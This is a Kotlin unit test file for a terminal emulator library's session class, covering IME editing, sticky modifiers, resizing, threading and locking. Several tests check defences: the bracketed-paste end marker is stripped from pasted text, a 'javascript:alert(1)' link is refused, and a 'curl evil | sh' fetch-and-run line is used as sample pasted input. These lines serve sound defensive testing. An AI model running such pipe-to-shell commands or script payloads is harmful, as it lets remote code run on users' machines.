/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

@file:OptIn(InternalVtfxApi::class)

package com.google.vtfx.session

import com.google.vtfx.core.InternalVtfxApi
import com.google.vtfx.core.KeyModifiers
import com.google.vtfx.core.KeyStroke
import com.google.vtfx.core.TerminalKey
import com.google.vtfx.gate.ClipboardAccess
import com.google.vtfx.gate.GatePolicy
import com.google.vtfx.gate.OpenUrlResult
import com.google.vtfx.gate.ReportedColors
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertNull
import kotlin.test.assertTrue
import org.junit.Test

class TerminalSessionTest {
    private val sent = StringBuilder()
    private val resizes = mutableListOf<Pair<Int, Int>>()
    private var bells = 0
    private val titles = mutableListOf<String>()
    private val stickyModifiersChanges = mutableListOf<KeyModifiers>()
    private var restarts = 0
    private val clipboard =
        object : ClipboardAccess {
            var text: String? = "pasted\u001b[201~\n"

            override fun write(text: String) {
                this.text = text
            }

            override fun read(): String? = text
        }
    private val session =
        TerminalSession(
                { sent.append(String(it, Charsets.UTF_8)) },
                columns = 20,
                rows = 5,
                clipboard = clipboard,
                listener =
                    object : TerminalSessionListener {
                        override fun onResize(columns: Int, rows: Int) {
                            resizes += Pair(columns, rows)
                        }

                        override fun onBell() {
                            bells++
                        }

                        override fun onTitleChanged(title: String) {
                            titles += title
                        }

                        override fun onStickyModifiersChanged(modifiers: KeyModifiers) {
                            stickyModifiersChanges += modifiers
                        }
                    },
            )
            .also { it.addObserver(RestartCounter { restarts++ }) }

    private fun feed(text: String) = session.feed(text.toByteArray(Charsets.UTF_8))

    @Test
    fun feedUpdatesTheScreen() {
        feed("hello\r\nworld")
        val snapshot = session.snapshot()
        assertEquals("hello", snapshot.line(0).text().trimEnd())
        assertEquals("world", snapshot.line(1).text().trimEnd())
    }

    @Test
    fun theExampleOfTheUsageGuideWorks() {
        // docs/usage.md section 8, which shows apps how to use the session in their tests.
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        session.feed("$ ".toByteArray())
        assertEquals("$", session.snapshot().line(0).text().trim())
        session.sendText("ls\r")
        assertEquals("ls\r", sent.toString())
    }

    @Test
    fun queriesAreAnsweredThroughTheGate() {
        feed("\u001b[c\u001b[2;3H\u001b[6n")
        assertEquals("\u001b[?62;22c\u001b[2;3R", sent.toString())
    }

    @Test
    fun titleAndBellAreReported() {
        feed("\u001b]2;my title\u0007\u0007")
        assertEquals("my title", session.title)
        assertEquals(listOf("my title"), titles)
        assertEquals(1, bells)
    }

    @Test
    fun bellsAndTitlesOfOneFeedAreReportedOnce() {
        feed("\u0007\u001b]2;first\u0007\u0007\u001b]2;last\u0007")
        assertEquals("last", session.title)
        assertEquals(listOf("last"), titles)
        assertEquals(1, bells)
    }

    @Test
    fun bellsAndTitlesAreReportedOnTheThreadThatFeeds() {
        val threads = mutableListOf<Thread>()
        val reporting =
            TerminalSession(
                {},
                listener =
                    object : TerminalSessionListener {
                        override fun onBell() {
                            threads += Thread.currentThread()
                        }

                        override fun onTitleChanged(title: String) {
                            threads += Thread.currentThread()
                        }
                    },
            )
        val thread = Thread { reporting.feed("\u0007\u001b]2;title\u0007".toByteArray()) }
        thread.start()
        thread.join()
        assertEquals(listOf(thread, thread), threads)
    }

    @Test
    fun theFirstResizeIsReportedEvenIfTheSizeIsUnchanged() {
        // The app can wait for the first report to start the host with the size displayed.
        session.resize(20, 5)
        assertEquals(listOf(Pair(20, 5)), resizes)
    }

    @Test
    fun laterResizesAreReportedOnlyWhenTheSizeChanges() {
        session.resize(20, 5)
        session.resize(20, 5)
        session.resize(30, 10)
        session.resize(30, 10)
        assertEquals(listOf(Pair(20, 5), Pair(30, 10)), resizes)
        assertEquals(30, session.snapshot().columns)
    }

    @Test
    fun aFirstResizeThatFailsIsNotTheFirst() {
        assertFailsWith<IllegalArgumentException> { session.resize(0, 5) }
        session.resize(20, 5)
        assertEquals(listOf(Pair(20, 5)), resizes)
    }

    @Test
    fun theSizeOfACellGivesPixelsToTheListenerAndTheHost() {
        val sizes = mutableListOf<List<Int>>()
        val sent = StringBuilder()
        val session =
            TerminalSession(
                { sent.append(String(it, Charsets.UTF_8)) },
                columns = 20,
                rows = 5,
                listener =
                    object : TerminalSessionListener {
                        override fun onResize(
                            columns: Int,
                            rows: Int,
                            widthPixels: Int,
                            heightPixels: Int,
                        ) {
                            sizes += listOf(columns, rows, widthPixels, heightPixels)
                        }
                    },
            )
        // Without a display, pixel sizes are unknown: the queries are not answered.
        session.feed("\u001b[14t\u001b[16t".toByteArray())
        session.resize(20, 5)
        session.resize(20, 5, 10, 21)
        session.resize(20, 5, 10, 21)
        session.resize(30, 6)
        session.feed("\u001b[14t\u001b[16t".toByteArray())
        assertEquals(
            listOf(listOf(20, 5, 0, 0), listOf(20, 5, 200, 105), listOf(30, 6, 300, 126)),
            sizes,
        )
        assertEquals("\u001b[4;126;300t\u001b[6;21;10t", sent.toString())
    }

    @Test
    fun listenersOfTheSizeInCellsAreStillCalled() {
        session.resize(20, 5, 10, 21)
        assertEquals(listOf(Pair(20, 5)), resizes)
    }

    @Test
    fun theSizeOfACellIsChecked() {
        assertFailsWith<IllegalArgumentException> { session.resize(20, 5, 10, 0) }
        assertFailsWith<IllegalArgumentException> { session.resize(20, 5, 1001, 20) }
        assertFailsWith<IllegalArgumentException> { session.resize(20, 5, -1, -1) }
        assertEquals(emptyList(), resizes)
    }

    @Test
    fun echoOfLongInputWrappingDoesNotResetTheIme() {
        session.edit { it.commitText("echo abcdefghijklmnopqrstuvwxyz") }
        feed("echo abcdefghijklmnopqrstuvwxyz")
        assertEquals(0, restarts)
        assertEquals("echo abcdefghijklmnopqrstuvwxyz", session.edit { it.text })
    }

    @Test
    fun echoWrappingAtTheBottomDoesNotResetTheIme() {
        feed("\u001b[5H")
        restarts = 0
        session.edit { it.commitText("echo abcdefghijklmnopqrstuvwxyz") }
        feed("echo abcdefghijklmnopqrstuvwxyz")
        assertEquals(0, restarts)
        assertEquals("echo abcdefghijklmnopqrstuvwxyz", session.edit { it.text })
    }

    @Test
    fun aNewLineAtTheBottomResetsTheIme() {
        feed("\u001b[5H")
        restarts = 0
        session.sendText("ls")
        feed("ls")
        feed("\r\n$ ")
        assertEquals(1, restarts)
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun outputOnAnotherLineResetsTheImeEvenIfTheCursorComesBack() {
        session.sendText("ls")
        feed("ls")
        feed("\u001b7\u001b[3Hdone\u001b8")
        assertEquals(1, restarts)
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun aResetOfTheTerminalResetsTheIme() {
        session.sendText("old")
        feed("old")
        feed("\u001bc")
        assertEquals(1, restarts)
        assertEquals("", session.edit { it.text })
        sent.setLength(0)
        assertEquals(false, session.edit { it.replaceText(0, 3, "new") })
        assertEquals("", sent.toString())
    }

    @Test
    fun goingToTheAlternateScreenAndBackInOneFeedResetsTheIme() {
        session.sendText("old")
        feed("old")
        feed("\u001b[?1049h\u001b[?1049l")
        assertEquals(1, restarts)
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun aResetOfTheTerminalWaitsForTheComposition() {
        session.sendText("old")
        session.edit { it.setComposingText("か") }
        feed("old\u001bc")
        assertEquals(0, restarts)
        session.edit { it.finishComposingText() }
        assertEquals("oldか", sent.toString())
        assertEquals(1, restarts)
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun keysAreEncodedWithTheCurrentModes() {
        session.sendKey(KeyStroke.Special(TerminalKey.Up))
        feed("\u001b[?1h")
        session.sendKey(KeyStroke.Special(TerminalKey.Up))
        assertEquals("\u001b[A\u001bOA", sent.toString())
    }

    @Test
    fun enterSendsCrLfInNewlineMode() {
        feed("\u001b[20h")
        session.sendText("\n")
        session.sendKey(KeyStroke.Special(TerminalKey.Enter))
        session.sendKey(KeyStroke.Special(TerminalKey.KeypadEnter))
        session.sendKey(KeyStroke.Special(TerminalKey.Enter, KeyModifiers.of(alt = true)))
        assertEquals("\r\n\r\n\r\n\u001b\r\n", sent.toString())
    }

    @Test
    fun stickyModifiersApplyToTheNextCharacterOnce() {
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.edit { it.commitText("cd") }
        assertEquals(KeyModifiers.None, session.stickyModifiers)
        session.edit { it.commitText("e") }
        assertEquals("\u0003de", sent.toString())
        // The app's change and the clearing are both reported, so that a key bar can follow them.
        assertEquals(
            listOf(KeyModifiers.of(ctrl = true), KeyModifiers.None),
            stickyModifiersChanges,
        )
    }

    @Test
    fun stickyModifiersApplyToKeys() {
        session.stickyModifiers = KeyModifiers.of(alt = true)
        session.sendKey(KeyStroke.Special(TerminalKey.Left))
        session.sendKey(KeyStroke.Special(TerminalKey.Left))
        assertEquals("\u001b[1;3D\u001b[D", sent.toString())
    }

    @Test
    fun armingStickyModifiersSendsTheComposingTextWithoutThem() {
        session.edit { it.setComposingText("cat") }
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        // The composing text was typed before the modifier: it is sent as is, and the IME, which
        // still has it, restarts.
        assertEquals("cat", sent.toString())
        assertEquals("", session.edit { it.text })
        assertEquals(1, restarts)
        session.sendKey(KeyStroke.Special(TerminalKey.Left))
        assertEquals("cat\u001b[1;5D", sent.toString())
    }

    @Test
    fun stickyModifiersApplyToTheTypedTextNotToTheComposingTextBeforeIt() {
        session.edit { it.setComposingText("ab") }
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.sendText("c")
        assertEquals("ab\u0003", sent.toString())
    }

    @Test
    fun stickyModifiersAreNotSpentOnTheComposingTextBeforeAPaste() {
        session.edit { it.setComposingText("d") }
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.paste("x")
        assertEquals("dx", sent.toString())
        assertEquals(KeyModifiers.of(ctrl = true), session.stickyModifiers)
    }

    @Test
    fun stickyModifiersApplyToTextComposedAfterThem() {
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.edit { it.setComposingText("c") }
        session.edit { it.finishComposingText() }
        assertEquals("\u0003", sent.toString())
    }

    @Test
    fun backspaceWithStickyModifiersResetsTheInputHistory() {
        session.sendText("foo bar")
        session.stickyModifiers = KeyModifiers.of(alt = true)
        session.edit { it.onKeyDown(KeyStroke.Special(TerminalKey.Backspace)) }
        // Alt+BS, which readline takes as deleting the word "bar".
        assertEquals("foo bar\u001b\u007f", sent.toString())
        assertEquals("", session.edit { it.text })
        assertEquals(1, restarts)
        // An IME correction of the text it saw before is then outside the history.
        assertFalse(session.edit { it.replaceText(4, 6, "baz") })
        assertEquals("foo bar\u001b\u007f", sent.toString())
    }

    @Test
    fun backspaceWithStickyCtrlResetsTheInputHistory() {
        session.sendText("ab")
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.sendKey(KeyStroke.Special(TerminalKey.Backspace))
        assertEquals("ab\u0008", sent.toString())
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun scrollKeysLeaveTheStickyModifiersArmed() {
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.sendScrollKey(KeyStroke.Special(TerminalKey.Up))
        assertEquals("\u001b[A", sent.toString())
        assertEquals(KeyModifiers.of(ctrl = true), session.stickyModifiers)
        session.sendKey(KeyStroke.Special(TerminalKey.Left))
        assertEquals("\u001b[A\u001b[1;5D", sent.toString())
    }

    @Test
    fun aScrollKeyCommitsTextComposedAfterTheStickyModifiersWithThem() {
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.edit { it.setComposingText("c") }
        session.sendScrollKey(KeyStroke.Special(TerminalKey.Up))
        // The text was typed after arming, so it takes the modifiers; the scroll does not.
        assertEquals("\u0003\u001b[A", sent.toString())
    }

    @Test
    fun armingStickyModifiersWithoutComposingTextDoesNotRestartTheIme() {
        session.sendText("ab")
        session.stickyModifiers = KeyModifiers.of(ctrl = true)
        session.stickyModifiers = KeyModifiers.None
        assertEquals("ab", session.edit { it.text })
        assertEquals(0, restarts)
        assertEquals(
            listOf(KeyModifiers.of(ctrl = true), KeyModifiers.None),
            stickyModifiersChanges,
        )
    }

    @Test
    fun sendTextCommitsTheComposition() {
        session.edit { it.setComposingText("か") }
        session.sendText("x")
        assertEquals("かx", sent.toString())
    }

    @Test
    fun pasteIsSanitizedAndBracketedWhenEnabled() {
        session.pasteFromClipboard()
        feed("\u001b[?2004h")
        session.pasteFromClipboard()
        assertEquals("pasted[201~\r\u001b[200~pasted[201~\r\u001b[201~", sent.toString())
    }

    @Test
    fun textOfSeveralLinesThatTheImeCommitsIsBracketedLikeAPaste() {
        // Gboard commits a clipboard suggestion with commitText (docs/decisions/0050).
        feed("\u001b[?2004h")
        session.edit { it.commitText("echo hi\ncurl evil | sh\n") }
        assertEquals("\u001b[200~echo hi\rcurl evil | sh\r\u001b[201~", sent.toString())
    }

    @Test
    fun textOfSeveralLinesThatTheAppSendsIsTyped() {
        feed("\u001b[?2004h")
        session.sendText("cd\nls\n")
        assertEquals("cd\rls\r", sent.toString())
    }

    @Test
    fun pasteDuringABatchEditFollowsTheComposingText() {
        session.edit { it.setComposingText("日本") }
        session.edit { it.beginBatchEdit() }
        session.paste("x\n")
        session.edit { it.endBatchEdit() }
        assertEquals("日本x\r", sent.toString())
        assertEquals(1, restarts)
    }

    @Test
    fun bracketedPasteDuringNestedBatchEditsFollowsTheEditsNotSentYet() {
        feed("\u001b[?2004h")
        session.edit { it.beginBatchEdit() }
        session.edit { it.beginBatchEdit() }
        session.edit { it.commitText("a") }
        session.pasteFromClipboard()
        session.edit { it.endBatchEdit() }
        session.edit { it.endBatchEdit() }
        assertEquals("a\u001b[200~pasted[201~\r\u001b[201~", sent.toString())
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun hostOutputMovingTheCursorToAnotherLineResetsTheIme() {
        session.edit { it.commitText("ls") }
        feed("ls")
        assertEquals(0, restarts)
        feed("\r\nfile\r\n$ ")
        assertEquals(1, restarts)
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun focusReportsAreSentWhenEnabled() {
        session.onFocusChanged(true)
        feed("\u001b[?1004h")
        session.onFocusChanged(false)
        session.onFocusChanged(true)
        assertEquals("\u001b[O\u001b[I", sent.toString())
    }

    @Test
    fun colorQueriesAreAnsweredOnlyWithTheDisplayColors() {
        feed("\u001b]11;?\u0007")
        assertEquals("", sent.toString())
        session.reportedColors = ReportedColors { 0xFFFFFF }
        feed("\u001b]11;?\u0007")
        assertEquals("\u001b]11;rgb:ffff/ffff/ffff\u001b\\", sent.toString())
    }

    @Test
    fun hyperlinksAreFoundAndOpenedThroughTheGate() {
        val opened = mutableListOf<String>()
        val linked =
            TerminalSession(
                {},
                urlOpener = {
                    opened += it
                    OpenUrlResult.Opened
                },
            )
        linked.feed(
            "\u001b]8;;https://example.com\u0007x\u001b]8;;javascript:alert(1)\u0007y".toByteArray()
        )
        val line = linked.snapshot().line(0)
        assertEquals("https://example.com", line.hyperlinkAt(0)?.uri)
        assertEquals(null, line.hyperlinkAt(5))
        assertEquals(OpenUrlResult.Opened, linked.openUrl(line.hyperlinkAt(0)!!.uri))
        assertEquals(OpenUrlResult.NotAllowed, linked.openUrl(line.hyperlinkAt(1)!!.uri))
        assertEquals(listOf("https://example.com"), opened)
    }

    @Test
    fun openUrlReturnsWhatTheUrlOpenerReported() {
        // A device without an app for the URL.
        val linked = TerminalSession({}, urlOpener = { OpenUrlResult.NoApp })

        val result = linked.openUrl("https://example.com")

        assertEquals(OpenUrlResult.NoApp, result)
    }

    @Test
    fun theScrollbackCanBeReadWithoutADisplay() {
        // The session has 5 rows; 8 lines leave the first 3 in the scrollback.
        feed((1..8).joinToString("\r\n") { "line $it" })
        assertEquals(3, session.scrollbackSize)
        assertEquals("line 4", session.snapshot().line(0).text().trim())
        val scrolled = session.snapshot(scrollOffset = session.scrollbackSize)
        assertEquals(3, scrolled.scrollOffset)
        assertEquals("line 1", scrolled.line(0).text().trim())
        // Beyond the scrollback, the offset is clamped.
        assertEquals(3, session.snapshot(scrollOffset = 100).scrollOffset)
        // The alternate screen shows no scrollback.
        feed("\u001b[?1049h")
        assertEquals(0, session.scrollbackSize)
        assertEquals(0, session.snapshot(scrollOffset = 3).scrollOffset)
    }

    @Test
    fun whetherAUrlCanBeOpenedIsKnownBeforeOpeningIt() {
        val opened = mutableListOf<String>()
        val linked =
            TerminalSession(
                {},
                urlOpener = {
                    opened += it
                    OpenUrlResult.Opened
                },
            )
        assertTrue(linked.canOpenUrl("https://example.com"))
        assertFalse(linked.canOpenUrl("javascript:alert(1)"))
        assertFalse(TerminalSession({}).canOpenUrl("https://example.com"))
        assertEquals(emptyList(), opened)
    }

    @Test
    fun losingFocusResetsTheIme() {
        session.edit { it.commitText("abc") }
        session.onFocusChanged(false)
        assertEquals("", session.edit { it.text })
    }

    @Test
    fun textOverTheHistoryLimitIsSentAtOnceDuringABatchEdit() {
        // Text the IME committed in one go, longer than the history's limit, inside a batch edit
        // that the IME may never end: it is sent and the history reset at once, so that taking it
        // back for reconversion cannot make the host receive a flood of DELs.
        val long = "a".repeat(70_000)
        session.edit { it.beginBatchEdit() }
        session.edit { it.commitText(long) }
        assertEquals(long, sent.toString())
        assertEquals("", session.edit { it.text })
        session.edit { it.setComposingText("b") }
        session.edit { it.endBatchEdit() }
        assertFalse(session.edit { it.setComposingRegion(0, long.length + 1) })
        assertEquals(long, sent.toString())
    }

    @Test
    fun editTellsTheDisplaysOfTheInputOnlyIfItSentAny() {
        var inputs = 0
        session.addObserver(
            object : SessionObserver {
                override fun onOutput(
                    scrolledLines: Long,
                    scrollbackShrank: Boolean,
                    synchronizing: Boolean,
                ) {}

                override fun onScreenChanged() {}

                override fun onUserInput() {
                    inputs++
                }

                override fun onRestartInput() {}
            }
        )
        session.edit { it.finishComposingText() }
        session.edit { it.setComposingText("に") }
        session.edit { it.text }
        assertEquals(0, inputs)
        session.edit { it.finishComposingText() }
        assertEquals(1, inputs)
        session.edit { it.deleteSurroundingText(1, 0) }
        assertEquals("", session.edit { it.text })
        assertEquals(2, inputs)
        // A Backspace with an empty edit buffer leaves it empty, but sends a DEL.
        session.edit { it.deleteSurroundingText(1, 0) }
        assertEquals(3, inputs)
        assertEquals("に\u007f\u007f", sent.toString())
    }

    @Test
    fun switchingDirectInputCommitsTheComposingTextAndResets() {
        val restarts = mutableListOf<Unit>()
        session.addObserver(RestartCounter { restarts += Unit })
        session.edit { it.commitText("a") }
        session.edit { it.setComposingText("にほ") }
        session.directInput = true
        assertEquals("aにほ", sent.toString())
        assertEquals("", session.edit { it.text })
        assertEquals(1, restarts.size)
        session.directInput = true
        assertEquals(1, restarts.size)
    }

    @Test
    fun everyOperationWorksOnAnyThread() {
        val failure = runOnAnotherThread {
            val other = TerminalSession({ sent.append(String(it, Charsets.UTF_8)) })
            other.feed("hello".toByteArray(Charsets.UTF_8))
            assertEquals("hello", other.snapshot().line(0).text().trimEnd())
            other.stickyModifiers = KeyModifiers.of(ctrl = true)
            other.sendText("c")
            other.directInput = true
            assertTrue(other.directInput)
            other.resize(30, 10)
            other.sendKey(KeyStroke.Special(TerminalKey.Enter))
        }
        assertNull(failure)
        assertEquals("\u0003\r", sent.toString())
    }

    @Test
    fun inputFromSeveralThreadsReachesTheHostInTheOrderMade() {
        // The IME editing model takes its input history for what the host received, in order.
        // Writes that yield give the threads a chance to overtake each other.
        val received = StringBuffer()
        val typing =
            TerminalSession({
                received.append(String(it, Charsets.UTF_8))
                Thread.yield()
            })
        val threads = List(4) { thread -> Thread { repeat(50) { typing.sendText("$thread") } } }
        threads.forEach { it.start() }
        threads.forEach { it.join() }
        assertEquals(200, received.length)
        assertEquals(typing.edit { it.text }, received.toString())
    }

    @Test
    fun inputWaitingForTheConnectionReachesTheHostInTheOrderItCame() {
        // While one thread is inside the connection, the threads with input wait for it; one that
        // comes later must not overtake those already waiting.
        val writing = CountDownLatch(1)
        val release = CountDownLatch(1)
        val received = StringBuffer()
        val typing =
            TerminalSession({
                if (String(it, Charsets.UTF_8) == "a") {
                    writing.countDown()
                    release.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
                }
                received.append(String(it, Charsets.UTF_8))
            })
        val first = Thread { typing.sendText("a") }
        first.start()
        writing.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
        val second = Thread { typing.sendText("b") }
        second.start()
        awaitBlocked(second)
        val third = Thread { typing.sendText("c") }
        third.start()
        awaitBlocked(third)

        release.countDown()
        first.join()
        second.join()
        third.join()

        assertEquals("abc", received.toString())
    }

    @Test
    fun anEditAfterOutputMovedToAnotherLineErasesNothingEvenBeforeTheFeedReturns() {
        // The edit takes the input lock while the feed that moved to another line waits for it
        // behind a thread inside the connection. DELs from the history of the previous line would
        // erase the host's new prompt.
        val writing = CountDownLatch(1)
        val release = CountDownLatch(1)
        val received = StringBuffer()
        val session =
            TerminalSession({
                if (String(it, Charsets.UTF_8) == " ") {
                    writing.countDown()
                    release.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
                }
                received.append(String(it, Charsets.UTF_8))
            })
        session.sendText("ls")
        session.feed("ls".toByteArray())
        val typing = Thread { session.sendText(" ") }
        typing.start()
        writing.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
        val editing = Thread { session.edit { it.replaceText(0, 3, "cat") } }
        editing.start()
        awaitBlocked(editing)
        val feeding = Thread { session.feed("ls \r\n$ ".toByteArray()) }
        feeding.start()
        awaitBlocked(feeding)

        release.countDown()
        typing.join()
        editing.join()
        feeding.join()

        assertEquals("ls ", received.toString())
    }

    @Test
    fun theListenerIsCalledWithoutTheSessionLocks() {
        // A listener that waits for another thread using the session would otherwise deadlock.
        lateinit var listening: TerminalSession
        val unblocked = mutableListOf<String>()
        fun useOnAnotherThread(caller: String) {
            val done = CountDownLatch(1)
            Thread {
                listening.snapshot()
                listening.sendText("x")
                done.countDown()
            }
                .start()
            if (done.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)) unblocked += caller
        }
        listening =
            TerminalSession(
                {},
                listener =
                    object : TerminalSessionListener {
                        override fun onResize(columns: Int, rows: Int) =
                            useOnAnotherThread("resize")

                        override fun onBell() = useOnAnotherThread("bell")

                        override fun onTitleChanged(title: String) = useOnAnotherThread("title")

                        override fun onStickyModifiersChanged(modifiers: KeyModifiers) {
                            if (modifiers.isEmpty) useOnAnotherThread("sticky modifiers")
                        }
                    },
            )
        listening.resize(30, 10)
        listening.feed("\u0007\u001b]2;t\u0007".toByteArray())
        listening.stickyModifiers = KeyModifiers.of(alt = true)
        listening.sendKey(KeyStroke.Special(TerminalKey.Left))
        assertEquals(listOf("resize", "bell", "title", "sticky modifiers"), unblocked)
    }

    @Test
    fun theLastStickyModifiersToldAreTheCurrentOnesWithSeveralThreads() {
        val inListener = CountDownLatch(1)
        val release = CountDownLatch(1)
        val told = mutableListOf<KeyModifiers>()
        lateinit var changing: TerminalSession
        changing =
            TerminalSession(
                {},
                listener =
                    object : TerminalSessionListener {
                        override fun onStickyModifiersChanged(modifiers: KeyModifiers) {
                            // The first change waits in the listener while another thread makes
                            // the second.
                            if (modifiers.ctrl && told.isEmpty()) {
                                inListener.countDown()
                                release.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
                            }
                            synchronized(told) { told += modifiers }
                        }
                    },
            )
        val first = Thread { changing.stickyModifiers = KeyModifiers.of(ctrl = true) }
        first.start()
        inListener.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
        changing.stickyModifiers = KeyModifiers.None
        release.countDown()
        first.join()
        assertEquals(KeyModifiers.None, changing.stickyModifiers)
        assertEquals(listOf(KeyModifiers.of(ctrl = true), KeyModifiers.None), told)
    }

    @Test
    fun theLastSizeToldIsTheCurrentOneWithSeveralThreads() {
        val inListener = CountDownLatch(1)
        val release = CountDownLatch(1)
        val told = mutableListOf<Pair<Int, Int>>()
        val resizing =
            TerminalSession(
                {},
                listener =
                    object : TerminalSessionListener {
                        override fun onResize(columns: Int, rows: Int) {
                            if (columns == 100) {
                                inListener.countDown()
                                release.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
                            }
                            synchronized(told) { told += Pair(columns, rows) }
                        }
                    },
            )
        val first = Thread { resizing.resize(100, 30) }
        first.start()
        inListener.await(TIMEOUT_MILLIS, TimeUnit.MILLISECONDS)
        resizing.resize(60, 20)
        release.countDown()
        first.join()
        val snapshot = resizing.snapshot()
        assertEquals(Pair(60, 20), Pair(snapshot.columns, snapshot.rows))
        assertEquals(listOf(Pair(100, 30), Pair(60, 20)), told)
    }

    @Test
    fun aListenerThatChangesTheValueIsToldAgainAfterItReturns() {
        val events = mutableListOf<String>()
        lateinit var changing: TerminalSession
        changing =
            TerminalSession(
                {},
                listener =
                    object : TerminalSessionListener {
                        override fun onStickyModifiersChanged(modifiers: KeyModifiers) {
                            events += "start $modifiers"
                            if (modifiers.alt) changing.stickyModifiers = KeyModifiers.None
                            events += "end $modifiers"
                        }
                    },
            )
        changing.stickyModifiers = KeyModifiers.of(alt = true)
        val alt = KeyModifiers.of(alt = true)
        val none = KeyModifiers.None
        assertEquals(listOf("start $alt", "end $alt", "start $none", "end $none"), events)
        assertEquals(KeyModifiers.None, changing.stickyModifiers)
    }

    @Test
    fun hostRequestsReachTheAppWithoutTheSessionLock() {
        // An app that waits for another thread using the session, while vtfx calls its code, used
        // to deadlock: the replies and OSC 52 were handled with the session's lock held
        // (docs/decisions/0024).
        lateinit var session: TerminalSession
        val unblocked = mutableListOf<String>()
        fun snapshotOnAnotherThread(caller: String) {
            val thread = Thread { session.snapshot() }
            thread.start()
            thread.join(TIMEOUT_MILLIS)
            if (!thread.isAlive) unblocked += caller
        }
        val clipboard =
            object : ClipboardAccess {
                override fun write(text: String) = snapshotOnAnotherThread("clipboard write")

                override fun read(): String {
                    snapshotOnAnotherThread("clipboard read")
                    return "x"
                }
            }
        session =
            TerminalSession(
                { snapshotOnAnotherThread("host write") },
                policy = GatePolicy(allowClipboardWrite = true, allowClipboardRead = true),
                clipboard = clipboard,
            )
        val thread = Thread {
            session.feed("\u001b[c\u001b]52;c;eA==\u0007\u001b]52;c;?\u0007".toByteArray())
        }
        thread.start()
        thread.join()
        assertEquals(
            listOf("host write", "clipboard write", "clipboard read", "host write"),
            unblocked,
        )
    }

    @Test
    fun feedingFromTheHostConnectionFails() {
        // It would re-enter the session, and it fails even when the output asks for no reply, so
        // that the mistake does not depend on what the host sends (docs/decisions/0024).
        lateinit var session: TerminalSession
        session = TerminalSession({ session.feed("x".toByteArray()) })
        assertFailsWith<IllegalStateException> { session.sendText("a") }
        val failure = runOnAnotherThread { session.feed("\u001b[c".toByteArray()) }
        assertTrue(failure is IllegalStateException, "$failure")
        assertEquals("", session.snapshot().line(0).text().trimEnd())
    }

    @Test
    fun sendingFromTheHostConnectionFailsBeforeTheEditorRecordsTheInput() {
        // The editor would take the input for received by the host (docs/decisions/0024).
        lateinit var session: TerminalSession
        var failure: Throwable? = null
        session =
            TerminalSession({ failure = runCatching { session.sendText("b") }.exceptionOrNull() })

        session.sendText("a")

        assertIs<IllegalStateException>(failure)
        assertEquals("a", session.edit { it.text })
    }

    @Test
    fun editsAfterSendingFromTheHostConnectionFailedEraseOnlyWhatTheHostReceived() {
        // DELs for input that the host never received would erase its characters
        // (docs/design/ime-contract.md, invariant 3).
        lateinit var session: TerminalSession
        val received = StringBuilder()
        session =
            TerminalSession({
                received.append(String(it, Charsets.UTF_8))
                runCatching { session.sendText("b") }
            })
        session.sendText("a")

        session.edit { it.replaceText(0, 1, "c") }

        assertEquals("a\u007fc", received.toString())
    }

    @Test
    fun sendingFromAnEditOperationFails() {
        // The nested operation would send while the outer one holds the session's lock.
        assertFailsWith<IllegalStateException> { session.edit { session.sendText("a") } }

        assertEquals("", sent.toString())
    }

    @Test
    fun feedingFromAnEditOperationFails() {
        // The host's output would change the terminal in the middle of the edit.
        assertFailsWith<IllegalStateException> { session.edit { feed("x") } }

        assertEquals("", session.snapshot().line(0).text().trimEnd())
    }

    private fun runOnAnotherThread(action: () -> Unit): Throwable? {
        var failure: Throwable? = null
        val thread = Thread {
            try {
                action()
            } catch (t: Throwable) {
                failure = t
            }
        }
        thread.start()
        thread.join()
        return failure
    }

    /** Waits until [thread] waits to take a lock. */
    private fun awaitBlocked(thread: Thread) {
        val deadline = System.nanoTime() + TimeUnit.MILLISECONDS.toNanos(TIMEOUT_MILLIS)
        while (thread.state != Thread.State.BLOCKED && thread.state != Thread.State.WAITING) {
            check(System.nanoTime() < deadline) { "$thread did not wait for a lock" }
            Thread.yield()
        }
    }

    /** Counts the restarts of the IME input that the session asks its displays for. */
    private class RestartCounter(private val onRestart: () -> Unit) : SessionObserver {
        override fun onOutput(
            scrolledLines: Long,
            scrollbackShrank: Boolean,
            synchronizing: Boolean,
        ) {}

        override fun onScreenChanged() {}

        override fun onUserInput() {}

        override fun onRestartInput() = onRestart()
    }

    private companion object {
        /** How long to wait for a thread that should not be blocked. */
        const val TIMEOUT_MILLIS = 2000L
    }
}
